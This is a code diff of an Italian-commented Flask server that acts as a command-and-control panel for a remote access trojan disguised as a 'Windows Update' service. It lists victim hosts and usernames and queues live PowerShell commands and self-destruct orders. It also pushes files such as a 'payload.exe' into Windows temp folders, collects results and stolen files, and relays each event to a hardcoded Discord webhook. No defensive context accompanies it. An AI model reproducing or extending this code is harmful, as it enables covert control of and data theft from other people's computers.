@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, send_file
+from flask import Flask, request, jsonify
 import threading
 import time
 import json
@@ -7,31 +7,32 @@ import hashlib
 import base64
 from datetime import datetime
 import requests
+import glob
 
 app = Flask(__name__)
 
 # Configurazione
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1435284134162464900/avJVpeaibF4iQyUlrD73-2JFZvpmNtZWeX-Cmbot3QU3tadH1wxjuOuZ-c7f9FsckPSt"  # ⚠️ Opzionale
-CURRENT_VERSION = "3.0-stealth"
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1435284134162464900/avJVpeaibF4iQyUlrD73-2JFZvpmNtZWeX-Cmbot3QU3tadH1wxjuOuZ-c7f9FsckPSt"  # ⚠️ SEMPRE CONFIGURATO
+CURRENT_VERSION = "4.0-light"
+
+# Settings logging
+MAX_LOG_FILES = 50
+LOG_RETENTION_HOURS = 24
 
 class ClientManager:
     def __init__(self):
-        self.clients = {}  # client_id -> client_data
-        self.device_to_client = {}  # device_id -> client_id
+        self.clients = {}
+        self.device_to_client = {}
         self.commands_queue = {}
         self.lock = threading.Lock()
         self.client_counter = 1000
     
     def get_or_create_client(self, device_id, client_data):
-        """
-        Trova client esistente o crea nuovo basato su device_id stabile
-        """
         with self.lock:
-            # Se device già registrato, aggiorna dati
+            # Client esistente
             if device_id in self.device_to_client:
                 client_id = self.device_to_client[device_id]
                 
-                # Aggiorna dati client
                 if client_id in self.clients:
                     self.clients[client_id].update(client_data)
                     self.clients[client_id]["last_seen"] = datetime.now()
@@ -44,7 +45,7 @@ class ClientManager:
                 
                 return client_id
             
-            # Nuovo device - crea nuovo client
+            # Nuovo client
             else:
                 client_id = f"C{self.client_counter}"
                 self.client_counter += 1
@@ -59,22 +60,11 @@ class ClientManager:
                 self.device_to_client[device_id] = client_id
                 
                 # Notifica Discord
-                if DISCORD_WEBHOOK:
-                    try:
-                        hostname = client_data.get('hostname', 'Unknown')
-                        username = client_data.get('username', 'Unknown')
-                        os_info = client_data.get('os', 'Unknown')
-                        
-                        payload = {
-                            "content": f"🆕 **Nuovo Client** {client_id}\n"
-                                      f"**Host:** {hostname}\n"
-                                      f"**User:** {username}\n"
-                                      f"**OS:** {os_info}",
-                            "username": "Windows Update Server"
-                        }
-                        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
-                    except:
-                        pass
+                send_to_discord(
+                    f"🆕 **Nuovo Client** {client_id}\n"
+                    f"**Host:** {client_data.get('hostname', 'Unknown')}\n"
+                    f"**User:** {client_data.get('username', 'Unknown')}"
+                )
                 
                 return client_id
     
@@ -110,16 +100,14 @@ class ClientManager:
                     "username": info.get("username", "Unknown"),
                     "os": info.get("os", "Unknown"),
                     "device_id": info.get("device_id", "Unknown"),
-                    "last_seen": info.get("last_seen").isoformat() if info.get("last_seen") else "Unknown",
-                    "first_seen": info.get("first_seen").isoformat() if info.get("first_seen") else "Unknown",
-                    "version": info.get("version", "Unknown"),
-                    "is_installed": info.get("is_installed", False)
+                    "last_seen": info.get("last_seen").isoformat() if info.get("last_seen") else "Unknown"
                 }
             return result
 
 client_manager = ClientManager()
 
 def send_to_discord(message):
+    """Invia a Discord - SEMPRE ATTIVO"""
     if not DISCORD_WEBHOOK:
         return
     
@@ -129,8 +117,52 @@ def send_to_discord(message):
     except:
         pass
 
+def save_result(data):
+    """Salva risultato con rotazione automatica"""
+    try:
+        # Crea directory se non esiste
+        os.makedirs("results", exist_ok=True)
+        
+        # Salva file
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        client_id = data.get('client_id', 'unknown')
+        filename = f"results/result_{client_id}_{timestamp}.json"
+        
+        with open(filename, 'w') as f:
+            json.dump(data, f, indent=2)
+        
+        # Auto-cleanup
+        cleanup_old_files()
+        
+    except Exception as e:
+        send_to_discord(f"❌ Errore salvataggio: {str(e)[:200]}")
+
+def cleanup_old_files():
+    """Cancella file vecchi >24h e mantiene max 50 file"""
+    try:
+        cutoff = time.time() - (LOG_RETENTION_HOURS * 3600)
+        
+        # Results files
+        results_files = sorted(glob.glob("results/*.json"), key=os.path.getmtime)
+        
+        # Cancella vecchi
+        for f in results_files:
+            if os.path.getmtime(f) < cutoff:
+                os.remove(f)
+        
+        # Mantieni max 50 file
+        if len(results_files) > MAX_LOG_FILES:
+            for f in results_files[:-MAX_LOG_FILES]:
+                try:
+                    os.remove(f)
+                except:
+                    pass
+                    
+    except Exception as e:
+        print(f"Cleanup error: {e}")
+
 # ============================================
-# 📊 API ENDPOINTS
+# 🏠 PAGINE WEB
 # ============================================
 
 @app.route('/')
@@ -140,27 +172,24 @@ def home():
     <h1>Windows Update Management v{CURRENT_VERSION}</h1>
     <p>Client attivi: {len(clients)}</p>
     <p><a href="/admin">Admin Panel</a></p>
-    <p><a href="/api/clients">JSON Clients</a></p>
     """
 
 @app.route('/admin')
 def admin_panel():
     clients = client_manager.list_clients()
     
-    # Genera opzioni client per dropdown
+    # Genera opzioni client
     clients_options = ""
     for client_id, info in clients.items():
-        display_text = f"{client_id} - {info['hostname']} ({info['username']}) - {info['os']}"
-        clients_options += f'<option value="{client_id}">{display_text}</option>'
+        display = f"{client_id} - {info['hostname']} ({info['username']})"
+        clients_options += f'<option value="{client_id}">{display}</option>'
     
-    # Genera righe tabella client
+    # Genera tabella client
     clients_rows = ""
     for client_id, info in clients.items():
         last_seen = info['last_seen']
         if 'T' in last_seen:
-            last_seen_display = last_seen.split('T')[0]
-        else:
-            last_seen_display = last_seen
+            last_seen = last_seen.split('T')[0]
         
         clients_rows += f"""
         <tr>
@@ -168,7 +197,7 @@ def admin_panel():
             <td>{info['hostname']}</td>
             <td>{info['username']}</td>
             <td>{info['os']}</td>
-            <td>{last_seen_display}</td>
+            <td>{last_seen}</td>
             <td>
                 <form action="/api/send_command" method="post" style="display: inline;">
                     <input type="hidden" name="client_id" value="{client_id}">
@@ -184,7 +213,6 @@ def admin_panel():
         </tr>
         """
     
-    # Se nessun client
     if not clients_rows:
         clients_rows = '<tr><td colspan="6">Nessun client connesso</td></tr>'
     
@@ -194,14 +222,13 @@ def admin_panel():
     <head>
         <title>Update Admin Panel</title>
         <style>
-            body {{ font-family: Arial, sans-serif; margin: 20px; }}
-            .section {{ margin: 20px 0; padding: 15px; border: 1px solid #ccc; border-radius: 5px; }}
-            textarea, input {{ width: 100%; margin: 5px 0; }}
-            button {{ padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer; }}
+            body {{ font-family: Arial; margin: 20px; }}
+            .section {{ margin: 20px 0; padding: 15px; border: 1px solid #ccc; }}
+            button {{ padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; }}
             button:hover {{ background: #0056b3; }}
             table {{ width: 100%; border-collapse: collapse; }}
-            th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
-            th {{ background-color: #f2f2f2; }}
+            th, td {{ border: 1px solid #ddd; padding: 8px; }}
+            th {{ background: #f2f2f2; }}
         </style>
     </head>
     <body>
@@ -218,7 +245,7 @@ def admin_panel():
                 <label>Comando:</label><br>
                 <select name="command" style="width: 100%; padding: 5px;">
                     <option value="systeminfo">System Information</option>
-                    <option value="list_files">List Files (User folders)</option>
+                    <option value="list_files">List Files</option>
                     <option value="active_users">Active Users</option>
                     <option value="get_info">Client Info</option>
                     <option value="self_destruct">💣 Self Destruct</option>
@@ -236,41 +263,41 @@ def admin_panel():
                     {clients_options}
                 </select><br><br>
                 
-                <label>Comando PowerShell:</label><br>
-                <textarea name="command" rows="4" placeholder="Get-Process | Select -First 10"></textarea><br><br>
+                <label>Comando:</label><br>
+                <textarea name="command" rows="3" style="width: 100%;" placeholder="Get-Process"></textarea><br><br>
                 
                 <button type="submit">Esegui PowerShell</button>
             </form>
         </div>
         
         <div class="section">
-            <h3>📥 Download File from Client</h3>
+            <h3>📥 Download File</h3>
             <form action="/api/request_download" method="post">
                 <label>Client:</label><br>
                 <select name="client_id" style="width: 100%; padding: 5px;">
                     {clients_options}
                 </select><br><br>
                 
-                <label>Percorso file sul client:</label><br>
-                <input type="text" name="filepath" placeholder="C:\\Users\\test\\document.txt" style="padding: 5px;"><br><br>
+                <label>Percorso file:</label><br>
+                <input type="text" name="filepath" style="width: 100%; padding: 5px;" placeholder="C:\\path\\to\\file.txt"><br><br>
                 
                 <button type="submit">Richiedi Download</button>
             </form>
         </div>
         
         <div class="section">
-            <h3>📤 Upload File to Client</h3>
+            <h3>📤 Upload File</h3>
             <form action="/api/prepare_upload" method="post">
                 <label>Client:</label><br>
                 <select name="client_id" style="width: 100%; padding: 5px;">
                     {clients_options}
                 </select><br><br>
                 
-                <label>Percorso locale sul server:</label><br>
-                <input type="text" name="server_path" placeholder="uploads/payload.exe" style="padding: 5px;"><br><br>
+                <label>File sul server:</label><br>
+                <input type="text" name="server_path" style="width: 100%; padding: 5px;" placeholder="uploads/file.txt"><br><br>
                 
-                <label>Percorso destinazione sul client:</label><br>
-                <input type="text" name="client_path" placeholder="C:\\Windows\\Temp\\update.exe" style="padding: 5px;"><br><br>
+                <label>Destinazione client:</label><br>
+                <input type="text" name="client_path" style="width: 100%; padding: 5px;" placeholder="C:\\Temp\\file.txt"><br><br>
                 
                 <button type="submit">Prepara Upload</button>
             </form>
@@ -291,7 +318,7 @@ def admin_panel():
             </table>
         </div>
         
-        <p><a href="/">Torna alla Home</a></p>
+        <p><a href="/">Home</a></p>
     </body>
     </html>
     '''
@@ -302,7 +329,6 @@ def admin_panel():
 
 @app.route('/api/register', methods=['POST'])
 def register_client():
-    """Registra nuovo client o aggiorna esistente"""
     try:
         data = request.json
         
@@ -310,16 +336,12 @@ def register_client():
             return jsonify({"status": "error", "message": "device_id required"}), 400
         
         device_id = data['device_id']
-        
-        # Crea/aggiorna client
         client_id = client_manager.get_or_create_client(device_id, data)
-        
-        send_to_discord(f"🟢 Client {client_id} attivo - {data.get('hostname', 'Unknown')}")
         
         return jsonify({
             "status": "success",
             "client_id": client_id,
-            "message": "Client registered/updated"
+            "message": "Client registered"
         })
         
     except Exception as e:
@@ -327,44 +349,36 @@ def register_client():
 
 @app.route('/api/heartbeat', methods=['GET'])
 def heartbeat():
-    """Endpoint heartbeat - leggero"""
     try:
         client_id = request.args.get('client_id')
         device_id = request.args.get('device_id')
         
         if not client_id or not device_id:
-            return jsonify({"status": "error", "message": "Missing parameters"}), 400
+            return jsonify({"status": "error", "message": "Missing params"}), 400
         
-        # Verifica client esistente
+        # Verifica client
         with client_manager.lock:
             if client_id not in client_manager.clients:
                 return jsonify({"status": "reregister", "message": "Client not found"}), 404
         
-        # Controlla se ci sono comandi in coda
+        # Controlla comandi
         command = client_manager.get_command(client_id)
         
         if command:
-            return jsonify({
-                "status": "command_available",
-                "message": "Command waiting"
-            })
+            return jsonify({"status": "command_available", "message": "Command waiting"})
         else:
             # Aggiorna last_seen
             with client_manager.lock:
                 if client_id in client_manager.clients:
                     client_manager.clients[client_id]["last_seen"] = datetime.now()
             
-            return jsonify({
-                "status": "ok",
-                "message": "Heartbeat received"
-            })
+            return jsonify({"status": "ok", "message": "Heartbeat received"})
             
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/api/get_command', methods=['GET'])
 def get_command():
-    """Restituisce comando in coda per il client"""
     try:
         client_id = request.args.get('client_id')
         
@@ -375,23 +389,15 @@ def get_command():
         
         if command:
             send_to_discord(f"📤 Invio comando a {client_id}: {command[:100]}")
-            
-            return jsonify({
-                "status": "success",
-                "command": command
-            })
+            return jsonify({"status": "success", "command": command})
         else:
-            return jsonify({
-                "status": "no_command",
-                "message": "No commands available"
-            })
+            return jsonify({"status": "no_command", "message": "No commands"})
             
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/api/results', methods=['POST'])
 def receive_results():
-    """Riceve risultati dai client"""
     try:
         data = request.json
         
@@ -402,133 +408,29 @@ def receive_results():
         command = data.get('command', 'unknown')
         results = data.get('results', {})
         
-        # Salva risultati su file
-        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        filename = f"results_{client_id}_{timestamp}.json"
-        
-        os.makedirs("results", exist_ok=True)
-        
-        with open(f"results/{filename}", 'w') as f:
-            json.dump(data, f, indent=2)
+        # Salva su file (con rotazione)
+        save_result(data)
         
         # Log su Discord
-        result_preview = str(results)[:500]
-        send_to_discord(f"📊 Risultati da {client_id}\n"
-                       f"Comando: {command}\n"
-                       f"Risultato: {result_preview}")
+        result_preview = str(results)[:300]
+        send_to_discord(f"📊 Risultati da {client_id}\nComando: {command}\nRisultato: {result_preview}")
         
-        return jsonify({"status": "success", "message": "Results saved"})
-        
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
-
-@app.route('/api/receive_file_info', methods=['POST'])
-def receive_file_info():
-    """Riceve informazioni su file da scaricare"""
-    try:
-        data = request.json
-        client_id = data.get('client_id')
-        file_info = data.get('results', {}).get('file_info', {})
-        
-        if not file_info:
-            return jsonify({"status": "error", "message": "No file info"}), 400
-        
-        # Salva file info per download chunked
-        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        filename = f"download_{client_id}_{timestamp}.info"
-        
-        os.makedirs("downloads", exist_ok=True)
-        
-        with open(f"downloads/{filename}", 'w') as f:
-            json.dump({
-                "client_id": client_id,
-                "file_info": file_info,
-                "request_time": timestamp,
-                "status": "pending"
-            }, f, indent=2)
-        
-        send_to_discord(f"📥 Download richiesto da {client_id}\n"
-                       f"File: {file_info.get('filename', 'unknown')}\n"
-                       f"Size: {file_info.get('size', 0)} bytes")
-        
-        return jsonify({
-            "status": "success",
-            "message": "File info received",
-            "info_file": filename
-        })
-        
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
-
-@app.route('/api/upload_chunk', methods=['POST'])
-def upload_chunk():
-    """Riceve chunk di file da client"""
-    try:
-        data = request.json
-        
-        client_id = data.get('client_id')
-        filename = data.get('filename')
-        chunk_index = data.get('chunk_index')
-        total_chunks = data.get('total_chunks')
-        chunk_data = data.get('data')
-        is_last = data.get('is_last', False)
-        
-        if not all([client_id, filename, chunk_data is not None]):
-            return jsonify({"status": "error", "message": "Missing parameters"}), 400
-        
-        # Decodifica chunk
-        try:
-            binary_data = base64.b64decode(chunk_data)
-        except:
-            return jsonify({"status": "error", "message": "Invalid base64"}), 400
-        
-        # Salva chunk
-        os.makedirs(f"downloads/{client_id}", exist_ok=True)
-        
-        chunk_filename = f"downloads/{client_id}/{filename}.chunk{chunk_index:04d}"
-        
-        with open(chunk_filename, 'wb') as f:
-            f.write(binary_data)
-        
-        # Se è l'ultimo chunk, ricostruisci file
-        if is_last:
-            output_path = f"downloads/{client_id}_{filename}"
-            
-            with open(output_path, 'wb') as outfile:
-                for i in range(total_chunks):
-                    chunk_file = f"downloads/{client_id}/{filename}.chunk{i:04d}"
-                    if os.path.exists(chunk_file):
-                        with open(chunk_file, 'rb') as infile:
-                            outfile.write(infile.read())
-                        os.remove(chunk_file)  # Cleanup chunk
-            
-            send_to_discord(f"✅ Download completato: {filename}\n"
-                           f"Da: {client_id}\n"
-                           f"Size: {os.path.getsize(output_path)} bytes")
-            
-            # Rimuovi directory chunk
-            try:
-                os.rmdir(f"downloads/{client_id}")
-            except:
-                pass
-        
-        return jsonify({"status": "success", "chunk": chunk_index})
+        return jsonify({"status": "success", "message": "Results received"})
         
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/api/send_command', methods=['POST'])
 def send_command():
-    """Web interface - invia comando"""
     try:
         client_id = request.form.get('client_id')
         command = request.form.get('command')
         
         if not client_id or not command:
-            return "Errore: client_id e command richiesti", 400
+            return "Errore: parametri mancanti", 400
         
         client_manager.add_command(client_id, command)
-        send_to_discord(f"🌐 Comando web '{command}' per {client_id}")
+        send_to_discord(f"🌐 Comando '{command}' per {client_id}")
         
         return f'''
         <h3>Comando Inviato!</h3>
@@ -542,7 +444,6 @@ def send_command():
 
 @app.route('/api/send_powershell', methods=['POST'])
 def send_powershell():
-    """Web interface - invia comando PowerShell"""
     try:
         client_id = request.form.get('client_id')
         ps_command = request.form.get('command')
@@ -550,7 +451,6 @@ def send_powershell():
         if not client_id or not ps_command:
             return "Errore: parametri mancanti", 400
         
-        # Costruisci comando per client
         command = f"powershell_live:{ps_command}"
         client_manager.add_command(client_id, command)
         
@@ -568,7 +468,6 @@ def send_powershell():
 
 @app.route('/api/request_download', methods=['POST'])
 def request_download():
-    """Richiede download file da client"""
     try:
         client_id = request.form.get('client_id')
         filepath = request.form.get('filepath')
@@ -585,7 +484,6 @@ def request_download():
         <h3>Download Richiesto!</h3>
         <p>Client: {client_id}</p>
         <p>File: {filepath}</p>
-        <p>Il file apparirà nella cartella 'downloads' quando pronto.</p>
         <p><a href="/admin">Torna al Panel</a></p>
         '''
         
@@ -594,7 +492,6 @@ def request_download():
 
 @app.route('/api/prepare_upload', methods=['POST'])
 def prepare_upload():
-    """Prepara upload file a client"""
     try:
         client_id = request.form.get('client_id')
         server_path = request.form.get('server_path')
@@ -603,31 +500,29 @@ def prepare_upload():
         if not all([client_id, server_path, client_path]):
             return "Errore: parametri mancanti", 400
         
-        # Verifica file esista
+        # Leggi file
         if not os.path.exists(server_path):
-            return f"Errore: file non trovato: {server_path}", 404
+            return f"Errore: file non trovato", 404
         
-        # Leggi file e codifica base64
         with open(server_path, 'rb') as f:
-            file_content = f.read()
+            content = f.read()
         
-        base64_content = base64.b64encode(file_content).decode('utf-8')
+        base64_content = base64.b64encode(content).decode('utf-8')
         
-        # Costruisci comando (potrebbe essere troppo grande, in produzione fare chunking)
-        if len(base64_content) > 1000000:  # 1MB
-            return "Errore: file troppo grande (>1MB). Implementare chunking.", 400
+        # Se file grande, avvisa
+        if len(base64_content) > 500000:  # ~500KB
+            send_to_discord(f"⚠️ File grande per upload: {len(content)} bytes")
         
         command = f"upload_file|{client_path}|{base64_content}"
         client_manager.add_command(client_id, command)
         
-        send_to_discord(f"📤 Upload a {client_id}: {os.path.basename(server_path)} → {client_path}")
+        send_to_discord(f"📤 Upload a {client_id}: {os.path.basename(server_path)}")
         
         return f'''
         <h3>Upload Preparato!</h3>
         <p>Client: {client_id}</p>
         <p>File: {os.path.basename(server_path)}</p>
-        <p>Destinazione: {client_path}</p>
-        <p>Size: {len(file_content)} bytes</p>
+        <p>Size: {len(content)} bytes</p>
         <p><a href="/admin">Torna al Panel</a></p>
         '''
         
@@ -636,7 +531,6 @@ def prepare_upload():
 
 @app.route('/api/clients', methods=['GET'])
 def list_clients_api():
-    """API JSON per lista client"""
     clients = client_manager.list_clients()
     return jsonify({
         "status": "success",
@@ -644,58 +538,27 @@ def list_clients_api():
         "clients": clients
     })
 
-@app.route('/api/cleanup', methods=['POST'])
-def cleanup():
-    """Pulizia client non visti da più di 24h"""
-    try:
-        cutoff = datetime.now().timestamp() - (24 * 3600)
-        removed = 0
-        
-        with client_manager.lock:
-            to_remove = []
-            for client_id, info in client_manager.clients.items():
-                last_seen = info.get('last_seen')
-                if last_seen and hasattr(last_seen, 'timestamp'):
-                    if last_seen.timestamp() < cutoff:
-                        to_remove.append(client_id)
-            
-            for client_id in to_remove:
-                client_manager.remove_client(client_id)
-                removed += 1
-        
-        return jsonify({
-            "status": "success",
-            "removed": removed,
-            "message": f"Rimossi {removed} client inattivi"
-        })
-        
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
-
 # ============================================
 # 🏁 AVVIO SERVER
 # ============================================
 if __name__ == '__main__':
-    # Crea directory necessarie
+    # Crea directory
     os.makedirs("results", exist_ok=True)
-    os.makedirs("downloads", exist_ok=True)
     os.makedirs("uploads", exist_ok=True)
+    os.makedirs("downloads", exist_ok=True)
     
-    # Avvia thread di cleanup
+    # Thread cleanup
     def cleanup_loop():
         while True:
             time.sleep(3600)  # Ogni ora
             try:
-                with app.app_context():
-                    cleanup()
+                cleanup_old_files()
             except:
                 pass
     
-    cleanup_thread = threading.Thread(target=cleanup_loop, daemon=True)
-    cleanup_thread.start()
+    threading.Thread(target=cleanup_loop, daemon=True).start()
     
-    send_to_discord(f"🚀 Windows Update Server v{CURRENT_VERSION} avviato")
+    send_to_discord(f"🚀 Server v{CURRENT_VERSION} avviato")
     
-    # PythonAnywhere usa PORT environment variable
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
